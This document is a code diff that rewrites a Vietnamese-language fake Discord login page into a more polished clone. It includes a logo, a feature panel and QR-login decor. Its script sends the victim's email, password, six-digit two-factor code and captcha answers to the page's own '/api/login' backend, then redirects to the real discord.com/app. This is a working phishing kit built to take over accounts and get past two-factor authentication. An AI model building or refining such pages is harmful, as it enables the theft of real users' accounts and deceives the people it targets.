@@ -1,17 +1,501 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Discord Login</title><style>body{background:#36393f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Whitney,'Helvetica Neue',Arial,sans-serif}.box{background:#2f3136;padding:32px;border-radius:8px;width:480px;max-width:90%}.box h1,.box h2{color:#fff}.box .sub{color:#b9bbbe;margin-bottom:20px}.input-group{margin-bottom:16px}.input-group label{color:#b9bbbe;display:block;margin-bottom:8px}.input-group input{background:#202225;border:1px solid #040405;border-radius:4px;padding:10px;width:100%;color:#fff;box-sizing:border-box}button{background:#5865f2;border:none;border-radius:4px;padding:12px;width:100%;color:#fff;cursor:pointer;margin-top:8px}.error{color:#f04747;margin-top:8px}.loading{color:#b9bbbe;margin-top:12px}.hidden{display:none}</style>
+<head>
+<meta charset="UTF-8">
+<title>Discord Login</title>
+<style>
+  :root {
+    --bg-primary: #313338;
+    --bg-surface: #2b2d31;
+    --bg-input: #1e1f22;
+    --brand: #5865f2;
+    --brand-hover: #4752c4;
+    --text-muted: #b5bac1;
+    --text-danger: #f23f42;
+    --border-subtle: #3b3f48;
+  }
+
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    background-color: var(--bg-primary);
+    font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 1rem;
+  }
+
+  /* Layout chính */
+  .container {
+    display: flex;
+    max-width: 1200px;
+    width: 100%;
+    background-color: var(--bg-primary);
+    border-radius: 20px;
+    overflow: hidden;
+  }
+
+  /* Panel bên trái */
+  .panel-info {
+    flex: 1;
+    background: linear-gradient(135deg, #1e1f22 0%, #2b2d31 100%);
+    padding: 4rem;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+  }
+
+  .logo {
+    font-size: 32px;
+    font-weight: 700;
+    color: white;
+    margin-bottom: 32px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .logo svg {
+    width: 48px;
+    height: 48px;
+  }
+
+  .panel-info h1 {
+    color: white;
+    font-size: 32px;
+    font-weight: 600;
+    margin-bottom: 16px;
+  }
+
+  .panel-info p {
+    color: var(--text-muted);
+    font-size: 16px;
+    line-height: 1.5;
+    margin-bottom: 32px;
+  }
+
+  .feature-item {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+
+  .feature-icon {
+    background: var(--bg-input);
+    width: 48px;
+    height: 48px;
+    border-radius: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--brand);
+  }
+
+  .feature-text {
+    color: #dbdee1;
+    font-size: 14px;
+    font-weight: 500;
+  }
+
+  /* Panel bên phải - form login */
+  .panel-login {
+    width: 480px;
+    background-color: var(--bg-surface);
+    padding: 32px;
+    border-radius: 16px;
+    margin: auto;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  }
+
+  .login-header {
+    text-align: center;
+    margin-bottom: 32px;
+  }
+
+  .login-header h2 {
+    color: white;
+    font-size: 24px;
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+
+  .login-header p {
+    color: var(--text-muted);
+    font-size: 14px;
+  }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  .form-group label {
+    display: block;
+    color: #dbdee1;
+    font-size: 12px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+  }
+
+  .form-group input {
+    width: 100%;
+    background-color: var(--bg-input);
+    border: 1px solid var(--border-subtle);
+    border-radius: 8px;
+    padding: 12px;
+    color: white;
+    font-size: 16px;
+    transition: all 0.2s;
+  }
+
+  .form-group input:focus {
+    outline: none;
+    border-color: var(--brand);
+  }
+
+  .forgot-password {
+    text-align: right;
+    margin-bottom: 20px;
+  }
+
+  .forgot-password a {
+    color: var(--brand);
+    font-size: 12px;
+    text-decoration: none;
+  }
+
+  .forgot-password a:hover {
+    text-decoration: underline;
+  }
+
+  button[type="submit"] {
+    width: 100%;
+    background-color: var(--brand);
+    border: none;
+    border-radius: 8px;
+    padding: 12px;
+    color: white;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+
+  button[type="submit"]:hover {
+    background-color: var(--brand-hover);
+  }
+
+  .register-link {
+    text-align: center;
+    margin-top: 20px;
+    color: var(--text-muted);
+    font-size: 14px;
+  }
+
+  .register-link a {
+    color: var(--brand);
+    text-decoration: none;
+  }
+
+  .qr-section {
+    margin-top: 32px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border-subtle);
+    text-align: center;
+  }
+
+  .qr-code {
+    width: 120px;
+    height: 120px;
+    background: white;
+    margin: 0 auto 12px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+  }
+
+  .qr-code svg {
+    width: 80px;
+    height: 80px;
+  }
+
+  .qr-section p {
+    color: var(--text-muted);
+    font-size: 12px;
+    margin-bottom: 4px;
+  }
+
+  .qr-section a {
+    color: var(--brand);
+    text-decoration: none;
+    font-size: 12px;
+  }
+
+  .error-message {
+    background-color: rgba(242, 63, 66, 0.1);
+    border-left: 4px solid var(--text-danger);
+    padding: 12px;
+    margin-top: 12px;
+    border-radius: 6px;
+    color: var(--text-danger);
+    font-size: 12px;
+  }
+
+  @media (max-width: 768px) {
+    .container {
+      flex-direction: column;
+    }
+    .panel-info {
+      display: none;
+    }
+    .panel-login {
+      width: 100%;
+      margin: 0;
+    }
+  }
+</style>
 <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 </head>
 <body>
-<div class="box" id="loginBox"><h1>Chào mừng trở lại!</h1><div class="sub">Đăng nhập để tiếp tục</div><form id="loginForm"><div class="input-group"><label>Email hoặc Số điện thoại</label><input type="text" id="email" required></div><div class="input-group"><label>Mật khẩu</label><input type="password" id="password" required></div><button type="submit">Đăng nhập</button><div class="error" id="loginError"></div><div class="loading hidden" id="loginLoading">Đang xử lý...</div></form></div>
-<div class="box hidden" id="mfaBox"><h2>Xác minh hai yếu tố</h2><p>Nhập mã từ ứng dụng Authenticator</p><form id="mfaForm"><div class="input-group"><label>Mã xác minh</label><input type="text" id="mfaCode" placeholder="000000" maxlength="6" required></div><button type="submit">Xác nhận</button><div class="error" id="mfaError"></div><div class="loading hidden" id="mfaLoading">Đang xác thực...</div></form></div>
-<div class="box hidden" id="captchaBox"><h2>Xác minh an toàn</h2><p>Vui lòng hoàn thành kiểm tra bên dưới</p><div id="captchaContainer"></div><button id="verifyCaptchaBtn">Xác nhận</button><div class="error" id="captchaError"></div><div class="loading hidden" id="captchaLoading">Đang kiểm tra...</div></div>
+<div class="container">
+  <div class="panel-info">
+    <div class="logo">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M20.5 5.5C21.3 6 22 6.8 22 8.5V18.5C22 20.5 20.5 22 18.5 22H5.5C3.5 22 2 20.5 2 18.5V8.5C2 6.8 2.7 6 3.5 5.5C4.3 5 5.3 4.5 6.5 4.5C7.5 4.5 8.3 4.8 9 5.2C9.5 4.5 10.5 4 11.5 4C12.5 4 13.5 4.5 14 5.2C14.7 4.8 15.5 4.5 16.5 4.5C17.7 4.5 18.7 5 19.5 5.5H20.5Z" fill="white"/>
+        <circle cx="8" cy="13" r="1.5" fill="black"/>
+        <circle cx="16" cy="13" r="1.5" fill="black"/>
+        <path d="M8 16.5C9.5 18 14.5 18 16 16.5" stroke="black" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <span>DISCORD</span>
+    </div>
+    <h1>Nơi trò chuyện, gắn kết cộng đồng</h1>
+    <p>Discord là nền tảng giúp kết nối mọi người qua trò chuyện bằng giọng nói, video và văn bản. Hàng triệu người dùng trên toàn thế giới đã tin dùng.</p>
+    <div class="feature-item">
+      <div class="feature-icon">🎤</div>
+      <div class="feature-text">Kênh thoại chất lượng cao</div>
+    </div>
+    <div class="feature-item">
+      <div class="feature-icon">💬</div>
+      <div class="feature-text">Trò chuyện văn bản đa dạng</div>
+    </div>
+    <div class="feature-item">
+      <div class="feature-icon">🎮</div>
+      <div class="feature-text">Tích hợp game & cộng đồng</div>
+    </div>
+  </div>
+  <div class="panel-login">
+    <div class="login-header">
+      <h2>Chào mừng trở lại!</h2>
+      <p>Chúng tôi rất vui được gặp lại bạn!</p>
+    </div>
+    <form id="loginForm">
+      <div class="form-group">
+        <label>Email hoặc số điện thoại</label>
+        <input type="text" id="email" name="email" required autocomplete="email">
+      </div>
+      <div class="form-group">
+        <label>Mật khẩu</label>
+        <input type="password" id="password" name="password" required autocomplete="current-password">
+      </div>
+      <div class="forgot-password">
+        <a href="#">Quên mật khẩu?</a>
+      </div>
+      <button type="submit">Đăng nhập</button>
+      <div class="register-link">
+        Chưa có tài khoản? <a href="#">Đăng ký</a>
+      </div>
+    </form>
+    <div class="qr-section">
+      <div class="qr-code" id="qrCodeTrigger">
+        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="4" y="4" width="6" height="6" fill="black"/>
+          <rect x="14" y="4" width="6" height="6" fill="black"/>
+          <rect x="4" y="14" width="6" height="6" fill="black"/>
+          <path d="M14 14H20V20H14V14Z" fill="black"/>
+        </svg>
+      </div>
+      <p>Đăng nhập bằng mã QR</p>
+      <a href="#">Quét bằng Discord trên điện thoại</a>
+    </div>
+    <div id="loginError" class="error-message" style="display: none;"></div>
+  </div>
+</div>
+
 <script>
-const API_URL='/api/login';let tempSession=null;let captchaData=null;
-document.getElementById('loginForm').addEventListener('submit',async function(e){e.preventDefault();const email=document.getElementById('email').value;const password=document.getElementById('password').value;if(!email||!password){document.getElementById('loginError').innerText='Vui lòng điền đầy đủ';return;}document.getElementById('loginLoading').classList.remove('hidden');document.getElementById('loginError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'login',email,password})});const data=await res.json();if(data.success){if(data.token){document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText='Đăng nhập thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else if(data.need_mfa){tempSession=data.session_id;document.getElementById('loginBox').classList.add('hidden');document.getElementById('mfaBox').classList.remove('hidden');document.getElementById('loginLoading').classList.add('hidden');}}else if(data.need_captcha){captchaData={session_id:data.session_id,sitekey:data.sitekey,rqdata:data.rqdata};document.getElementById('loginBox').classList.add('hidden');document.getElementById('captchaBox').classList.remove('hidden');document.getElementById('loginLoading').classList.add('hidden');document.getElementById('captchaContainer').innerHTML='<div class="h-captcha" data-sitekey="'+data.sitekey+'" data-rqdata="'+encodeURIComponent(data.rqdata||'')+'"></div>';if(typeof hcaptcha!=='undefined')hcaptcha.render();}else{document.getElementById('loginLoading').classList.add('hidden');let errMsg=data.error;if(errMsg==='unverified_email') errMsg='Tài khoản chưa xác minh email. Vui lòng xác minh trước.';else if(errMsg==='invalid_creds') errMsg='Sai email hoặc mật khẩu.';document.getElementById('loginError').innerText=errMsg||'Đăng nhập thất bại.';}}catch(err){document.getElementById('loginLoading').classList.add('hidden');document.getElementById('loginError').innerText='Lỗi kết nối máy chủ.';}}});
-document.getElementById('mfaForm').addEventListener('submit',async function(e){e.preventDefault();const code=document.getElementById('mfaCode').value;if(!code||code.length<6){document.getElementById('mfaError').innerText='Nhập mã 6 số';return;}document.getElementById('mfaLoading').classList.remove('hidden');document.getElementById('mfaError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'mfa',session_id:tempSession,code})});const data=await res.json();if(data.success&&data.token){document.getElementById('mfaLoading').classList.add('hidden');document.getElementById('mfaError').innerText='Xác thực thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else{document.getElementById('mfaLoading').classList.add('hidden');document.getElementById('mfaError').innerText=data.error||'Mã không hợp lệ';}}catch(err){document.getElementById('mfaLoading').classList.add('hidden');document.getElementById('mfaError').innerText='Lỗi hệ thống';}}});
-document.getElementById('verifyCaptchaBtn').addEventListener('click',async function(){const captchaResponse=hcaptcha.getResponse();if(!captchaResponse){document.getElementById('captchaError').innerText='Vui lòng hoàn thành captcha';return;}document.getElementById('captchaLoading').classList.remove('hidden');document.getElementById('captchaError').innerText='';try{const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'captcha',session_id:captchaData.session_id,captcha_response:captchaResponse})});const data=await res.json();if(data.success){if(data.token){document.getElementById('captchaLoading').classList.add('hidden');document.getElementById('captchaError').innerText='Đăng nhập thành công!';setTimeout(()=>{window.location.href='https://discord.com/app';},1500);}else if(data.need_mfa){tempSession=data.session_id;document.getElementById('captchaBox').classList.add('hidden');document.getElementById('mfaBox').classList.remove('hidden');document.getElementById('captchaLoading').classList.add('hidden');}}else{document.getElementById('captchaLoading').classList.add('hidden');document.getElementById('captchaError').innerText=data.error||'Captcha không hợp lệ';}}catch(err){document.getElementById('captchaLoading').classList.add('hidden');document.getElementById('captchaError').innerText='Lỗi hệ thống';}}});
+  const API_URL = '/api/login';
+  let tempSession = null;
+  let captchaData = null;
+
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const errorDiv = document.getElementById('loginError');
+
+    if (!email || !password) {
+      errorDiv.style.display = 'block';
+      errorDiv.innerText = 'Vui lòng điền đầy đủ thông tin.';
+      return;
+    }
+
+    errorDiv.style.display = 'none';
+
+    try {
+      const response = await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ step: 'login', email, password })
+      });
+      const data = await response.json();
+
+      if (data.success) {
+        if (data.token) {
+          // Đăng nhập thành công, chuyển hướng
+          window.location.href = 'https://discord.com/app';
+        } else if (data.need_mfa) {
+          tempSession = data.session_id;
+          // Chuyển sang giao diện nhập mã 2FA
+          showMFAForm();
+        }
+      } else if (data.need_captcha) {
+        // Lưu thông tin captcha
+        captchaData = {
+          session_id: data.session_id,
+          sitekey: data.sitekey,
+          rqdata: data.rqdata
+        };
+        showCaptchaForm();
+      } else {
+        let errMsg = data.error;
+        if (errMsg === 'unverified_email') errMsg = 'Tài khoản chưa được xác minh. Vui lòng kiểm tra email.';
+        else if (errMsg === 'invalid_creds') errMsg = 'Email hoặc mật khẩu không đúng.';
+        else errMsg = errMsg || 'Đăng nhập thất bại.';
+        errorDiv.style.display = 'block';
+        errorDiv.innerText = errMsg;
+      }
+    } catch (error) {
+      errorDiv.style.display = 'block';
+      errorDiv.innerText = 'Lỗi kết nối đến máy chủ.';
+      console.error('Fetch error:', error);
+    }
+  });
+
+  function showMFAForm() {
+    // Tạo form nhập mã 2FA
+    const loginPanel = document.querySelector('.panel-login');
+    loginPanel.innerHTML = `
+      <div class="login-header">
+        <h2>Xác minh hai yếu tố</h2>
+        <p>Nhập mã từ ứng dụng Authenticator</p>
+      </div>
+      <form id="mfaForm">
+        <div class="form-group">
+          <label>Mã xác minh</label>
+          <input type="text" id="mfaCode" placeholder="000000" maxlength="6" required>
+        </div>
+        <button type="submit">Xác nhận</button>
+      </form>
+      <div id="mfaError" class="error-message" style="display: none;"></div>
+    `;
+
+    document.getElementById('mfaForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const code = document.getElementById('mfaCode').value;
+      const errorDiv = document.getElementById('mfaError');
+
+      if (!code || code.length < 6) {
+        errorDiv.style.display = 'block';
+        errorDiv.innerText = 'Vui lòng nhập mã 6 số.';
+        return;
+      }
+
+      errorDiv.style.display = 'none';
+
+      try {
+        const response = await fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ step: 'mfa', session_id: tempSession, code })
+        });
+        const data = await response.json();
+
+        if (data.success && data.token) {
+          window.location.href = 'https://discord.com/app';
+        } else {
+          errorDiv.style.display = 'block';
+          errorDiv.innerText = data.error || 'Mã xác minh không đúng.';
+        }
+      } catch (error) {
+        errorDiv.style.display = 'block';
+        errorDiv.innerText = 'Lỗi hệ thống, vui lòng thử lại.';
+      }
+    });
+  }
+
+  function showCaptchaForm() {
+    const loginPanel = document.querySelector('.panel-login');
+    loginPanel.innerHTML = `
+      <div class="login-header">
+        <h2>Xác minh an toàn</h2>
+        <p>Vui lòng hoàn thành kiểm tra bên dưới</p>
+      </div>
+      <div id="captchaContainer"></div>
+      <button id="verifyCaptchaBtn" style="margin-top: 20px;">Xác nhận</button>
+      <div id="captchaError" class="error-message" style="display: none;"></div>
+    `;
+
+    document.getElementById('captchaContainer').innerHTML = `<div class="h-captcha" data-sitekey="${captchaData.sitekey}" data-rqdata="${encodeURIComponent(captchaData.rqdata || '')}"></div>`;
+    if (typeof hcaptcha !== 'undefined') {
+      hcaptcha.render();
+    }
+
+    document.getElementById('verifyCaptchaBtn').addEventListener('click', async function() {
+      const captchaResponse = hcaptcha.getResponse();
+      const errorDiv = document.getElementById('captchaError');
+
+      if (!captchaResponse) {
+        errorDiv.style.display = 'block';
+        errorDiv.innerText = 'Vui lòng hoàn thành captcha.';
+        return;
+      }
+
+      errorDiv.style.display = 'none';
+
+      try {
+        const response = await fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ step: 'captcha', session_id: captchaData.session_id, captcha_response: captchaResponse })
+        });
+        const data = await response.json();
+
+        if (data.success) {
+          if (data.token) {
+            window.location.href = 'https://discord.com/app';
+          } else if (data.need_mfa) {
+            tempSession = data.session_id;
+            showMFAForm();
+          }
+        } else {
+          errorDiv.style.display = 'block';
+          errorDiv.innerText = data.error || 'Captcha không hợp lệ.';
+        }
+      } catch (error) {
+        errorDiv.style.display = 'block';
+        errorDiv.innerText = 'Lỗi hệ thống.';
+      }
+    });
+  }
 </script>
 </body>
 </html>
